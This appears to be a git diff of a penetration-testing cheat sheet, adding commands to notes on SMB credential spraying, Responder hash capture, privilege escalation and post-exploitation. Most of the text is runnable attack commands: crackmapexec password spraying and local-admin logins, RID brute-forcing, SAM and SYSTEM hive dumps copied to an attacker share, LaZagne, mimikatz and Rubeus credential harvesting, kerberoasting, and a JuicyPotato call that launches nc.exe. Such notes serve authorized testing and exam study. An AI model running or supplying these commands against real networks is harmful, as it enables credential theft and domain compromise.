@@ -124,7 +124,7 @@ proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS   --continue-on-success
 proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS --continue-on-success
 # cme creds attempt not brute force
 proxychains4 -q cme smb DOMAIN_NAME  -u USERS -p PASS --continue-on-success --no-bruteforce
-# check if creds reused
+# check if creds reused and see permissions to shares
 for each in $(cat hosts.txt);do cme smb $each -u USER -p PASS --shares;done
 # Grep user list, look for sid > 1000, not always work
 cme smb DOMAIN -u guest -p '' --rid-brute | grep  SidTypeUser
@@ -141,6 +141,8 @@ cme winrm IP -u USER -p PASS
 cme ssh IP -u USER -p PASS
 # if mssql show access granted, try sqsh to SQLi to RCE
 cme mssql IP -u USER -p PASS 
+# try to authenticate as local computer administrator
+cme smb IP -u Administrator -p PASS --local-auth
 ```
 
 ### Autorecon
@@ -501,9 +503,10 @@ set responder
 responder -I tun0
 ```
 To launch the attack remotely, use `file://IP/file` instead of http/smb etc
+
 To launch the attack locally (in a windows host), use `net use Y: \\KALI_IP\share`
 
-crack the captured hash with hashcat 5600
+crack the captured hash with hashcat mode 5600
 
 ## 3. File Transfer
 ### Linux target
@@ -762,13 +765,15 @@ juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe
 
 [sh](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)  
 
-## 5. Post Exploitation
-There might be some valuable information for pivoting over the network, post exploitation is necessary.
+## 5. Post Exploitation and AD-related Enumeration
+There might be some valuable information for pivoting over an organizational network, post exploitation is necessary.
 ### Creds harvesting
 #### Useful tools
 [LaZagne.exe](https://github.com/AlessandroZ/LaZagne)
 
 [mimikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master)
+
+[Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 
 ```powershell
 .\LaZagne.exe all -oN
@@ -780,6 +785,9 @@ reg save HKLM\SAM C:\users\public\SAM
 reg save HKLM\SYSTEM C:\users\public\SYSTEM
 copy .\*.txt X:\hashes\
 copy C:\users\public\S*M X:\dump\
+# Try ASREP roast and kerberoast inside a domain-joined computer
+.\Rubeus.exe asreproast /outfile:hash.txt
+.\Rubeus.exe kerberoast /outfile:hash.txt
 ```
 
 ### Cracking harvested hashes
